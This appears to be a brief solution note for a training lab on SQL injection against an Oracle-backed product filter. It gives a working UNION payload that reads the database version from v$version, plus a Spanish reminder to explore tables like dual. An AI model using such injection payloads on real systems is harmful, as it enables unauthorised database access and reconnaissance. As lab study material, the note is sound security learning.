
# Lab: SQL injection attack, querying the database type and version on Oracle

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.
```java
pests' union select  'a', banner from v$version -- -

/Investigar la bd tablas definidas ejemplo dual ,v$version y columnas banner
```